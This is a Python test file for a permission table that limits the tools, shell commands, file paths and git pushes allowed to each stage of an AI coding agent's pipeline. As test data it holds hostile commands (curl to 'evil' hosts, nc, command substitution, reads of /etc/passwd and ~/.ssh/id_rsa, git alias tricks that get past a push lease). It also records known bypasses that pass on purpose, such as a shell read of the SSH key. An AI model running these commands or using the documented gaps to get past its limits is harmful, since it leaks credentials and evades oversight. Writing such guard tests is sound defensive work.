"""Tests for the table that decides what a step may do.

`plan.md` Risk 3 is the concern these stand against, and it is not fully answerable: a
first-word allowlist does not bound what `git` can be told to do. What is testable is that
the obvious ways past it are closed, that writes cannot leave the workspace, and that a
tool nobody granted is refused whatever declared it — which is the shape that was measured.
"""

from __future__ import annotations

import inspect
import tempfile
import unittest
from pathlib import Path

from coscc import policy
from coscc.policy import READ_TOOLS, Grant, check_command, decide, grant_for

IMPL = grant_for("impl")


class OnlyImplAndOnlyAutonomous(unittest.TestCase):
    def test_impl_carries_tools_when_it_is_set_to_run_itself(self):
        self.assertTrue(IMPL.opens_anything)
        self.assertIn("Write", IMPL.tools)
        self.assertIn("Bash", IMPL.tools)
        self.assertGreater(IMPL.max_turns, 1)
        self.assertGreater(IMPL.max_budget_usd, 0)

    def test_a_stage_the_table_does_not_name_carries_nothing(self):
        """Was `test_the_same_stage_in_manual_carries_nothing`.

        `0020` `spec.md` `## Answers`, answer 1: grants follow the stage, not the mode, so
        there is no `manual` left to carry nothing. What stays locked is a stage the table
        does not name.
        """
        self.assertEqual(grant_for("idea"), Grant())
        self.assertEqual(grant_for("intent"), Grant())

    def test_impl_writes_its_own_artifact_and_prose_stages_do_not(self):
        self.assertFalse(IMPL.app_writes_artifact)
        self.assertTrue(grant_for("spec").app_writes_artifact)


class OneGrantPerStage(unittest.TestCase):
    """`0020` `spec.md` `## Answers`, answer 1: tools follow the stage, in every mode."""

    def test_grants_are_keyed_by_stage_alone(self):
        for key in policy.GRANTS:
            self.assertIsInstance(key, str, key)

    def test_grant_for_takes_no_mode(self):
        self.assertEqual(list(inspect.signature(grant_for).parameters), ["stage"])

    def test_spec_has_its_own_grant(self):
        """`0020` R1. Without it `spec` fell to `Grant()`: no tools, one turn."""
        self.assertNotEqual(grant_for("spec"), Grant())

    def test_spec_reads_and_only_reads(self):
        """`0020` R2: reading, bounded like writing, and nothing else."""
        spec = grant_for("spec")
        self.assertEqual(spec.tools, READ_TOOLS)
        self.assertEqual(spec.commands, ())
        self.assertEqual(policy.beyond_reading(spec), ())
        self.assertTrue(spec.app_writes_artifact)
        ws, unit = "/tmp/ws", "/tmp/data/units/ws-abc/.cos/0001_a"
        self.assertIn(
            "reading outside",
            decide(spec, "Read", {"file_path": "/etc/passwd"}, ws, unit),
        )
        self.assertEqual(decide(spec, "Read", {"file_path": f"{ws}/a.py"}, ws, unit), "")
        for tool in ("Write", "Bash"):
            self.assertIn("was not granted", decide(spec, tool, {}, ws, unit))

    def test_spec_has_the_turns_plan_has(self):
        """`0020` R3. Copied from `plan`, not measured for `spec`."""
        self.assertEqual(grant_for("spec").max_turns, grant_for("plan").max_turns)
        self.assertEqual(grant_for("spec").max_budget_usd, grant_for("plan").max_budget_usd)

    def test_every_other_grant_is_unchanged(self):
        """`0020` R6: the values each stage held before this unit, written out."""
        rw = READ_TOOLS + policy.WRITE_TOOLS + policy.EXEC_TOOLS
        expected = {
            "impl": Grant(tools=rw, commands=policy.IMPL_COMMANDS, max_turns=120,
                          max_budget_usd=8.0, app_writes_artifact=False),
            "plan": Grant(tools=READ_TOOLS, max_turns=40, max_budget_usd=4.0),
            "pr": Grant(tools=rw, commands=policy.PR_COMMANDS, max_turns=30,
                        max_budget_usd=3.0, app_writes_artifact=False,
                        warning=policy.PR_WARNING, denied=policy.MERGE_IS_SHIPS),
            "review": Grant(tools=READ_TOOLS, max_turns=20, max_budget_usd=2.0),
            "ship": Grant(tools=rw, commands=policy.PR_COMMANDS, max_turns=30,
                          max_budget_usd=3.0, app_writes_artifact=False,
                          warning=policy.SHIP_WARNING),
        }
        # `integrate` since `0035`: not a stage, and pinned in `GeboPushesOnlyWithTheLease`.
        # `spike` since `0039`: pinned in `SpikeWritesOnlyItsScratch`.
        self.assertEqual(set(policy.GRANTS), set(expected) | {"spec", "integrate", "spike"})
        for stage, grant in expected.items():
            self.assertEqual(grant_for(stage), grant, stage)


class AToolNobodyGrantedIsRefused(unittest.TestCase):
    def test_an_mcp_tool_is_refused_by_construction(self):
        # Eleven of these were measured arriving at a session created with `tools=[]`.
        # They are refused here because their names can never be in a grant.
        for tool in (
            "mcp__claude_ai_Claude_Docs__delete",
            "mcp__microsoft-learn__microsoft_docs_fetch",
        ):
            self.assertIn("was not granted", decide(IMPL, tool, {}, "/tmp"))

    def test_a_granted_read_tool_passes(self):
        self.assertEqual(decide(IMPL, "Read", {"file_path": "/tmp/x"}, "/tmp"), "")

    def test_an_empty_grant_refuses_everything(self):
        for tool in ("Read", "Write", "Bash"):
            self.assertIn("was not granted", decide(Grant(), tool, {}, "/tmp"))


class WritesStayInTheWorkspace(unittest.TestCase):
    def test_a_write_inside_the_workspace_passes(self):
        with tempfile.TemporaryDirectory() as d:
            target = Path(d) / "src" / "a.py"
            self.assertEqual(decide(IMPL, "Write", {"file_path": str(target)}, d), "")

    def test_a_write_outside_the_workspace_is_refused(self):
        with tempfile.TemporaryDirectory() as d:
            for bad in ("/etc/passwd", "/tmp/elsewhere.txt", str(Path(d).parent / "up.txt")):
                self.assertIn(
                    "outside the workspace", decide(IMPL, "Write", {"file_path": bad}, d), bad
                )

    def test_a_traversal_back_out_is_refused_after_resolving(self):
        with tempfile.TemporaryDirectory() as d:
            bad = str(Path(d) / ".." / ".." / "etc" / "passwd")
            self.assertIn("outside the workspace", decide(IMPL, "Write", {"file_path": bad}, d))

    def test_the_workspace_root_itself_is_allowed(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(decide(IMPL, "Write", {"file_path": d}, d), "")


class CommandsAreCheckedSegmentBySegment(unittest.TestCase):
    def test_an_allowed_command_passes(self):
        for good in ("npm test", "git status", "uv run python -m unittest", "ls -la"):
            self.assertEqual(check_command(IMPL, good), "", good)

    def test_every_segment_is_checked_not_just_the_first(self):
        # The failure this closes: `npm test; curl evil` would pass a check that only read
        # the first word of the line.
        for bad in ("npm test; curl http://x", "git status && wget x", "ls | nc host 1"):
            self.assertIn("may not run", check_command(IMPL, bad), bad)

    def test_substitution_is_refused_because_the_first_word_stops_predicting(self):
        for bad in ("git $(curl evil)", "ls `whoami`", "npm ${X}", "cat <(curl x)"):
            self.assertIn("substitution", check_command(IMPL, bad), bad)

    def test_a_path_prefix_does_not_smuggle_a_command_past(self):
        self.assertIn("may not run", check_command(IMPL, "/usr/bin/curl http://x"))
        self.assertEqual(check_command(IMPL, "/usr/bin/git status"), "")

    def test_a_leading_assignment_is_stepped_over(self):
        self.assertEqual(check_command(IMPL, "CI=1 npm test"), "")
        self.assertIn("may not run", check_command(IMPL, "CI=1 curl http://x"))

    def test_an_empty_command_is_refused(self):
        self.assertIn("empty", check_command(IMPL, "   "))

    def test_redirection_into_a_file_is_refused(self):
        # A redirect writes without any write tool being called, so the path check in
        # `decide` never sees it. Found while reading a real run on 2026-09-22.
        for bad in ("echo x > /etc/passwd", "cat a >> b", "npm test > out.txt"):
            self.assertIn("redirecting into a file", check_command(IMPL, bad), bad)

    def test_a_descriptor_redirect_is_not_a_file_redirect(self):
        # `2>&1` is the common case and touches no file. It also used to break the
        # splitter: the `&` read as a separator and the `1` as a command.
        for good in ("npm test 2>&1", "ls >&2", "uv run python -m unittest 2>&1 | tail -5"):
            self.assertEqual(check_command(IMPL, good), "", good)

    def test_a_bash_call_goes_through_the_command_check(self):
        self.assertIn("may not run", decide(IMPL, "Bash", {"command": "curl http://x"}, "/tmp"))
        self.assertEqual(decide(IMPL, "Bash", {"command": "npm test"}, "/tmp"), "")


class ThePrStepSaysWhatItWillReach(unittest.TestCase):
    PR = grant_for("pr")

    def test_it_may_run_git_and_gh_and_not_a_package_manager(self):
        self.assertEqual(check_command(self.PR, "git push -u origin HEAD"), "")
        self.assertEqual(check_command(self.PR, "gh pr create --fill"), "")
        # `pr` proposes a change that already exists; it has no reason to build or install.
        for bad in ("npm install x", "uv run python -m pytest"):
            self.assertIn("may not run", check_command(self.PR, bad), bad)

    def test_it_may_ask_its_own_gate(self):
        """The first line of `write-pr/SKILL.md`, which this grant used to refuse.

        Measured 2026-09-23: a `pr` step running through the board was refused with
        `this step may not run 'node'` and stopped before pushing, because the gate it is
        told to consult is a node script. It was right to stop; the table was wrong.
        """
        gate = (
            "node .claude/scripts/cos.mjs --root /store gate "
            "0001_product-describes-a-state-it-is-not-in pr"
        )
        self.assertEqual(check_command(self.PR, gate), "")

    def test_it_carries_a_warning_and_impl_does_not(self):
        # `spec.md` C4: the capability comes from the machine's own gh login, so it has to
        # be readable before the step starts rather than only in a design document.
        self.assertIn("gh", self.PR.warning.lower())
        self.assertIn("every repository", self.PR.warning)
        self.assertEqual(IMPL.warning, "")

    def test_the_warning_is_on_the_only_grant_pr_has(self):
        """Was `test_manual_carries_neither_tools_nor_warning`.

        `0020` `spec.md` `## Answers`, answer 1: there is one grant per stage now, so no
        mode exists in which `pr` runs without its warning shown before the button.
        """
        self.assertTrue(grant_for("pr").opens_anything)
        self.assertEqual(grant_for("pr").warning, policy.PR_WARNING)

    def test_its_ceilings_are_lower_than_impls(self):
        self.assertLess(self.PR.max_turns, IMPL.max_turns)
        self.assertLess(self.PR.max_budget_usd, IMPL.max_budget_usd)


class MergingIsShipsNotPrs(unittest.TestCase):
    """`0015`: `pr` stops at an open pull request; `ship` merges after a review passed."""

    PR = grant_for("pr")
    SHIP = grant_for("ship")

    def test_pr_is_refused_the_merge_and_told_whose_it_is(self):
        for line in (
            "gh pr merge --squash --delete-branch",
            "gh pr merge 7",
            "git push -u origin HEAD && gh pr merge --squash",
            "/usr/bin/gh pr merge",
        ):
            reason = check_command(self.PR, line)
            self.assertIn("merging is the ship stage's", reason, line)

    def test_pr_may_still_open_and_watch_the_pull_request(self):
        for line in ("gh pr create --fill", "gh pr checks 7 --watch", "gh pr view 7"):
            self.assertEqual(check_command(self.PR, line), "", line)

    def test_ship_may_merge(self):
        self.assertEqual(check_command(self.SHIP, "gh pr merge --squash --delete-branch"), "")
        self.assertFalse(self.SHIP.app_writes_artifact)
        self.assertIn("gh pr merge", self.SHIP.warning)

    def test_ship_is_no_longer_a_prose_stage(self):
        """Was `..._and_manual_ship_carries_nothing`. `0020` `spec.md` `## Answers`,
        answer 1, removed the mode from the grant, so the second half now says what `ship`
        does carry rather than what `manual` did not."""
        self.assertNotIn("ship", policy.PROSE_STAGES)
        self.assertNotEqual(grant_for("ship").commands, ())

    def test_review_reads_and_only_reads(self):
        review = grant_for("review")
        self.assertEqual(review.tools, policy.READ_TOOLS)
        self.assertEqual(policy.beyond_reading(review), ())
        self.assertIn("review", policy.PROSE_STAGES)

    def test_a_flag_in_front_does_not_walk_past_the_deny_list(self):
        """`0015` review round 1, F1: flags are removed before the prefix is compared."""
        for line in (
            "gh -R o/r pr merge 7",
            "gh --repo o/r pr merge 7",
            "gh --repo=o/r pr merge 7",
            "gh pr -R o/r merge 7",
            "gh --hostname github.com pr merge 7",
            "gh api -X PUT repos/o/r/pulls/7/merge",
            "gh alias set m 'pr merge'",
        ):
            self.assertIn("merging is the ship stage's", check_command(self.PR, line), line)
        # A value flag's value is not read as a word, but a real word after it still is.
        self.assertEqual(check_command(self.PR, "gh -R o/r pr view 7"), "")
        self.assertEqual(check_command(self.PR, "gh api repos/o/r/pulls/7"), "")

    def test_the_known_limit_of_the_deny_list(self):
        """`0015` plan, Risk 5: the list still reads tokens, not what runs. `node -e` may
        spawn `gh`, and an alias defined before the step runs under its own name. Pinned so
        that nobody reads this grant as a guarantee; `.claude/CLAUDE.md` says the same."""
        self.assertEqual(check_command(self.PR, "node -e 'require(\"child_process\")'"), "")
        self.assertEqual(check_command(self.PR, "gh m 7"), "")


class TheKnownLimit(unittest.TestCase):
    def test_an_allowed_binary_can_still_be_told_to_do_a_lot(self):
        """`plan.md` Risk 3, written down as a passing test rather than left implied.

        `git` is on the list because a step has to be able to check its own work. Nothing
        here stops it being handed arguments that reach further than that. The bound is
        `cwd`, the write check above, and the turn and budget ceilings — not this list.
        """
        self.assertEqual(check_command(IMPL, "git push --force"), "")
        self.assertEqual(check_command(IMPL, "npm install something"), "")


if __name__ == "__main__":
    unittest.main()


class TheWriteBoundaryIsTheWorkspacePlusOneDirectory(unittest.TestCase):
    """`0014` `spec.md` C2. A security guard widened, so both sides get a test.

    `0014` moved every artifact out of the workspace and into the product's store, which
    put the file `impl` and `pr` must write outside the only place they were allowed to
    write. The boundary now admits **one** more directory: the step's own unit.
    """

    def setUp(self):
        self.grant = policy.grant_for("impl")
        self.workspace = "/tmp/ws"
        self.unit = "/tmp/data/units/ws-abc/.cos/0001_a-problem"

    def _decide(self, path: str, unit_dir: str | None = None) -> str:
        return policy.decide(
            self.grant, "Write", {"file_path": path}, self.workspace, unit_dir
        )

    def test_a_step_may_write_its_own_artifact(self):
        self.assertEqual(self._decide(f"{self.unit}/impl.md", self.unit), "")

    def test_a_step_may_still_write_code_in_the_workspace(self):
        self.assertEqual(self._decide(f"{self.workspace}/src/a.py", self.unit), "")

    def test_it_is_one_directory_and_not_the_whole_store(self):
        # The sibling unit is the case that matters: a prefix check on the store would
        # let any step rewrite any other unit's artifacts.
        sibling = "/tmp/data/units/ws-abc/.cos/0002_another/impl.md"
        self.assertIn("outside the workspace", self._decide(sibling, self.unit))
        store = "/tmp/data/units/ws-abc/.cos/anything.md"
        self.assertIn("outside the workspace", self._decide(store, self.unit))

    def test_everywhere_else_is_still_refused(self):
        for path in ("/etc/passwd", "/tmp/data/cos.db", "/tmp/ws/../elsewhere/x.py", "~/.ssh/id"):
            self.assertIn("outside the workspace", self._decide(path, self.unit), path)

    def test_without_a_unit_directory_the_boundary_is_what_it_always_was(self):
        # Every prose stage runs this way, and they are granted no write tools at all --
        # so this is the shape that must not have loosened.
        self.assertEqual(self._decide(f"{self.workspace}/src/a.py"), "")
        self.assertIn("outside the workspace", self._decide(f"{self.unit}/impl.md"))

    def test_a_shell_redirect_is_still_refused_whatever_the_boundary_is(self):
        # The write boundary never sees a redirect; `check_command` is what stops it, and
        # widening one must not have touched the other.
        reason = policy.decide(
            self.grant, "Bash", {"command": f"echo x > {self.unit}/impl.md"},
            self.workspace, self.unit,
        )
        self.assertIn("redirect", reason)


class ReadsStayInTheCheckoutAndTheUnit(unittest.TestCase):
    """`0020` `spec.md` `## Answers`, answer 2: reading has the boundary writing has.

    Every grant holding `Read` is held to it, `impl` included, not only the prose stages.
    """

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        root = Path(self._tmp.name)
        self.ws = root / "ws"
        self.unit = root / "data" / "units" / "ws-abc" / ".cos" / "0001_a-problem"
        (self.ws / "src").mkdir(parents=True)
        self.unit.mkdir(parents=True)
        self.grant = Grant(tools=READ_TOOLS)

    def tearDown(self):
        self._tmp.cleanup()

    def _decide(self, tool: str, tool_input: dict, grant: Grant | None = None) -> str:
        return decide(grant or self.grant, tool, tool_input, str(self.ws), str(self.unit))

    def test_a_read_in_the_workspace_passes(self):
        self.assertEqual(self._decide("Read", {"file_path": str(self.ws / "src" / "a.py")}), "")

    def test_a_read_in_the_units_own_directory_passes(self):
        self.assertEqual(self._decide("Read", {"file_path": str(self.unit / "spec.md")}), "")

    def test_a_read_anywhere_else_is_refused(self):
        sibling = self.unit.parent / "0002_another" / "impl.md"
        for bad in (
            "/etc/passwd", "~/.ssh/id_rsa", "~/.config/coscc/env",
            str(sibling), str(self.ws / ".." / "x"),
        ):
            self.assertIn(
                "reading outside the workspace", self._decide("Read", {"file_path": bad}), bad
            )

    def test_a_relative_path_is_read_from_the_workspace(self):
        self.assertEqual(self._decide("Read", {"file_path": "src/a.py"}), "")
        self.assertIn("outside", self._decide("Read", {"file_path": "../../etc/passwd"}))

    def test_a_glob_without_a_path_searches_the_workspace(self):
        self.assertEqual(self._decide("Glob", {"pattern": "**/*.py"}), "")

    def test_a_glob_aimed_elsewhere_is_refused(self):
        for tool_input in (
            {"pattern": "*", "path": "/etc"},
            {"pattern": "/home/*/.ssh/*"},
            {"pattern": "../**/*"},
        ):
            self.assertIn("reading outside", self._decide("Glob", tool_input), tool_input)

    def test_an_absolute_glob_inside_the_workspace_passes(self):
        self.assertEqual(self._decide("Glob", {"pattern": f"{self.ws}/src/*.py"}), "")

    def test_a_grep_aimed_elsewhere_is_refused(self):
        self.assertIn("reading outside", self._decide("Grep", {"pattern": "x", "path": "/etc"}))
        self.assertEqual(self._decide("Grep", {"pattern": "x", "path": str(self.ws)}), "")

    def test_a_symlink_out_of_the_workspace_is_refused(self):
        link = self.ws / "escape"
        link.symlink_to("/etc")
        self.assertIn(
            "reading outside", self._decide("Read", {"file_path": str(link / "passwd")})
        )

    def test_the_boundary_holds_for_impl_too(self):
        self.assertIn(
            "reading outside",
            self._decide("Read", {"file_path": "/etc/passwd"}, grant=IMPL),
        )
        self.assertEqual(
            self._decide("Read", {"file_path": str(self.ws / "src" / "a.py")}, grant=IMPL), ""
        )


class TheReadBoundaryIsNotASandbox(unittest.TestCase):
    """`0020` plan, Risk 3, pinned as passing tests so nobody reads the boundary as a guarantee.

    `impl`, `pr` and `ship` keep `cat` and `head` in their commands, and `check_command`
    reads no paths, so a shell read walks past the `Read` check. Only `spec`, `plan` and
    `review`, which hold no `Bash`, are actually held by it.
    """

    def test_a_shell_read_is_not_checked(self):
        self.assertEqual(decide(IMPL, "Bash", {"command": "cat ~/.ssh/id_rsa"}, "/tmp/ws"), "")

    def test_a_glob_pattern_is_read_only_up_to_its_first_wildcard(self):
        # Only the fixed prefix is checked. A pattern that does not start with `/` or `~`
        # is taken as relative to the workspace, whatever the tool later makes of it.
        self.assertEqual(
            decide(Grant(tools=READ_TOOLS), "Glob", {"pattern": "{a,b}/*"}, "/tmp/ws"), ""
        )


class TheImplCeilingsCameFromMeasurement(unittest.TestCase):
    """Three of four `impl` steps run through the board died at the turn ceiling.

    Recorded here rather than only in a comment, because the next person to find this
    number too high will want to know whether it was reasoned or observed.
    """

    # turns taken, what it cost, whether the step wrote its artifact
    RUNS = (
        (51, 2.5317, False),
        (51, 1.7866, False),
        (23, 0.6611, True),
        (51, 2.4099, False),
    )

    def test_the_ceiling_clears_every_attempt_that_was_measured(self):
        worst = max(turns for turns, _, _ in self.RUNS)
        self.assertGreater(
            IMPL.max_turns, worst,
            "a ceiling at or below the highest real attempt stops the same steps again",
        )

    def test_the_budget_does_not_stop_a_step_the_turns_would_allow(self):
        """Two ceilings on one step: the lower one is the only one that matters.

        At the measured cost per turn, a step allowed 120 turns must be allowed the money
        those turns cost, or the budget becomes the real limit and the turn count is
        decoration.
        """
        per_turn = sum(c for _, c, _ in self.RUNS) / sum(t for t, _, _ in self.RUNS)
        self.assertGreater(IMPL.max_budget_usd, IMPL.max_turns * per_turn)

    def test_the_only_run_that_finished_is_not_evidence_the_ceiling_was_enough(self):
        """It finished in 23 turns because two exhausted runs had already done the work."""
        finished = [turns for turns, _, done in self.RUNS if done]
        exhausted = [turns for turns, _, done in self.RUNS if not done]
        self.assertEqual(len(finished), 1)
        self.assertTrue(all(t > finished[0] for t in exhausted))


class ThePlanCeilingClearsTheOneItHit(unittest.TestCase):
    """`0021`'s plan stopped at 20 turns on 2026-09-23 and returned nothing."""

    def test_the_plan_ceiling_is_above_the_one_that_was_hit(self):
        self.assertGreater(grant_for("plan").max_turns, 20)

    def test_plan_still_only_reads(self):
        # Raising the ceiling must not widen what the stage may do.
        self.assertEqual(grant_for("plan").tools, READ_TOOLS)
        self.assertEqual(grant_for("plan").commands, ())


class GeboPushesOnlyWithTheLease(unittest.TestCase):
    """`0035` R6: one push, leased to the head the step began at, on the unit's branch."""

    G = grant_for("integrate")
    BRANCH = "feat/x"
    HEAD = "a" * 40
    LEASE = (BRANCH, HEAD)
    OK = f"git push --force-with-lease=feat/x:{'a' * 40} origin feat/x"

    def run_(self, command, lease=LEASE):
        return check_command(self.G, command, lease)

    def test_the_ceilings_are_impls_chosen_not_measured(self):
        self.assertEqual((self.G.max_turns, self.G.max_budget_usd), (120, 8.0))
        self.assertTrue(self.G.push_needs_lease)
        self.assertFalse(self.G.app_writes_artifact)
        self.assertEqual(self.G.warning, policy.INTEGRATE_WARNING)
        self.assertIn("gh", self.G.commands)

    def test_the_one_allowed_push(self):
        self.assertEqual(self.run_(self.OK), "")
        self.assertEqual(self.run_(f"git push --force-with-lease=feat/x:{self.HEAD} origin HEAD:feat/x"), "")
        self.assertEqual(self.run_(f"git push -u --force-with-lease=feat/x:{self.HEAD} origin feat/x"), "")

    def test_every_other_push_is_refused_with_its_own_reason(self):
        cases = {
            "git push origin feat/x": "exactly one",
            "git push --force origin feat/x": "--force",
            "git push -f origin feat/x": "--force",
            "git push --force-with-lease origin feat/x": "needs a value",
            f"git push --force-with-lease=feat/x:{'b' * 40} origin feat/x": "bound to",
            f"git push --force-with-lease=feat/x:{'a' * 7} origin feat/x": "bound to",
            f"git push --force-with-lease=feat/x:{self.HEAD} origin main": "may only name",
            f"git push --force-with-lease=feat/x:{self.HEAD} origin feat/x:main": "may only name",
            f"git push --force-with-lease=feat/x:{self.HEAD} --all origin": "--all",
            f"git push --force-with-lease=feat/x:{self.HEAD} --mirror origin": "--mirror",
            f"git push --force-with-lease=feat/x:{self.HEAD} --tags origin feat/x": "--tags",
            f"git push --force-with-lease=feat/x:{self.HEAD} --delete origin feat/x": "--delete",
            f"git -C . push --force-with-lease=feat/x:{self.HEAD} origin feat/x": "nothing between",
        }
        for command, why in cases.items():
            with self.subTest(command=command):
                reason = self.run_(command)
                self.assertIn(why, reason)

    def test_a_push_in_anothers_arguments_is_not_a_push(self):
        """`0035` review round 1, F3: `push` as a word, not as the subcommand."""
        for command in ("git log --grep push", "git commit -m push", "git branch push-fix"):
            with self.subTest(command=command):
                self.assertEqual(self.run_(command), "")
        for command in ("git --no-pager push origin feat/x", "git -c a=b push origin feat/x"):
            with self.subTest(command=command):
                self.assertIn("nothing between", self.run_(command))

    def test_no_lease_means_no_push(self):
        self.assertIn("no lease", self.run_(self.OK, lease=None))

    def test_merge_pull_and_update_branch_are_refused(self):
        for command in ("git merge origin/main", "git pull --rebase origin main", "gh pr merge 7",
                        "gh -R o/r pr update-branch 7 --rebase", "gh api -X PUT repos/o/r/pulls/7/merge"):
            with self.subTest(command=command):
                self.assertNotEqual(self.run_(command), "")

    def test_rebase_and_tests_run(self):
        for command in ("git rebase origin/main", "git rebase --continue", "git rebase --abort",
                        "npm test", "uv run python -m unittest", "gh pr checks 7"):
            with self.subTest(command=command):
                self.assertEqual(self.run_(command), "")

    def test_roads_past_the_lease_that_the_grant_holds_are_refused(self):
        """`0035` review round 2, F4: moving the branch without saying `git push`."""
        cases = {
            "gh api -X PATCH repos/o/r/git/refs/heads/feat/x -f sha=abc -F force=true": "no lease",
            "gh -R o/r api graphql -f query=x": "no lease",
            "gh repo sync o/r --branch feat/x --force": "no lease",
            "gh extension install o/gh-x": "extension",
            "git send-pack origin +HEAD:refs/heads/feat/x": "without the lease",
            "git http-push origin feat/x": "without the lease",
            "git -c alias.p=push p --force origin feat/x": "alias",
            "git -c Alias.p=push p --force origin feat/x": "alias",
            "git config alias.p push": "alias",
            "git config --global alias.p push": "alias",
            "git -c include.path=x p": "alias",
            "git --config-env=alias.p=V p": "alias",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p": "alias",
        }
        for command, why in cases.items():
            with self.subTest(command=command):
                self.assertIn(why, self.run_(command))

    def test_reading_the_pull_request_stays_open(self):
        for command in ("gh pr view 7 --json headRefOid", "gh pr checks 7", "git config user.name",
                        "GIT_EDITOR=true git rebase --continue"):
            with self.subTest(command=command):
                self.assertEqual(self.run_(command), "")

    def test_the_known_limit_c6(self):
        """`0035` spec C6: tokens, not what runs. A program the grant may start can spawn
        `git push --force` itself — `node -e`, `python -c`, or a script the step wrote and
        then ran through `npm test`."""
        for command in ("node -e 'require(\"child_process\")'", "python -c 'import subprocess'",
                        "python3 push.py", "npm test"):
            with self.subTest(command=command):
                self.assertEqual(self.run_(command), "")

    def test_the_new_refusals_are_geboes_alone(self):
        self.assertEqual(check_command(grant_for("pr"), "gh api repos/o/r/pulls/7"), "")
        self.assertEqual(check_command(grant_for("impl"), "git config alias.st status"), "")

    def test_other_grants_push_as_before(self):
        self.assertEqual(check_command(grant_for("pr"), "git push origin feat/x"), "")


class GeboReadsAnExplicitList(unittest.TestCase):
    """`0035` R7: `read_also` widens reading by named paths, and never writing."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        base = Path(self._tmp.name)
        self.tree = base / "tree"
        self.own = base / "units" / "0035_x"
        self.other = base / "units" / "0030_y"
        for d in (self.tree, self.own, self.other):
            d.mkdir(parents=True)
        (self.other / "intent.md").write_text("x")
        (self.other / "impl.md").write_text("x")
        self.G = grant_for("integrate")
        self.also = (str(self.own), str(self.other / "intent.md"))

    def tearDown(self):
        self._tmp.cleanup()

    def d(self, tool, path):
        return decide(self.G, tool, {"file_path": str(path)}, str(self.tree), None, read_also=self.also)

    def test_a_listed_file_reads_and_its_neighbour_does_not(self):
        self.assertEqual(self.d("Read", self.other / "intent.md"), "")
        self.assertIn("reading outside", self.d("Read", self.other / "impl.md"))

    def test_its_own_unit_folder_reads_but_is_never_written(self):
        self.assertEqual(self.d("Read", self.own / "plan.md"), "")
        self.assertIn("writing outside", self.d("Write", self.own / "impl.md"))

    def test_the_worktree_is_written(self):
        self.assertEqual(self.d("Write", self.tree / "a.py"), "")


class SpikeWritesOnlyItsScratch(unittest.TestCase):
    """`0039` R10, R11: `spike` runs code, writes only its throwaway `cwd`, and never `git`."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        base = Path(self._tmp.name)
        self.scratch = base / "spikes" / "slot" / "0039_x"
        self.tree = base / "worktrees" / "slot" / "0039_x"
        self.unit = base / "units" / "slot" / ".cos" / "0039_x"
        for d in (self.scratch, self.tree, self.unit):
            d.mkdir(parents=True)
        self.G = grant_for("spike")

    def tearDown(self):
        self._tmp.cleanup()

    def d(self, tool, path):
        also = (str(self.tree), str(self.unit))
        return decide(self.G, tool, {"file_path": str(path)}, str(self.scratch), None, read_also=also)

    def test_the_grant_is_the_one_the_spec_names(self):
        self.assertEqual(self.G.tools, READ_TOOLS + policy.WRITE_TOOLS + policy.EXEC_TOOLS)
        self.assertEqual((self.G.max_turns, self.G.max_budget_usd), (40, 4.0))
        self.assertTrue(self.G.app_writes_artifact)
        self.assertIn("arbitrary code", self.G.warning)
        self.assertNotIn("spike", policy.PROSE_STAGES)

    def test_git_is_not_among_its_commands(self):
        # C2: `beyond_reading` does not guard this grant, so this line does.
        self.assertNotIn("git", self.G.commands)
        self.assertIn("this step may not run 'git'", check_command(self.G, "git -C /tmp commit -m x"))
        self.assertEqual(check_command(self.G, "python -c 'print(1)'"), "")

    def test_it_reads_the_worktree_and_the_unit(self):
        self.assertEqual(self.d("Read", self.tree / "coscc" / "policy.py"), "")
        self.assertEqual(self.d("Read", self.unit / "spec.md"), "")

    def test_it_writes_its_scratch_and_nothing_it_reads(self):
        self.assertEqual(self.d("Write", self.scratch / "probe.py"), "")
        self.assertIn("writing outside", self.d("Write", self.tree / "probe.py"))
        self.assertIn("writing outside", self.d("Write", self.unit / "spec.md"))
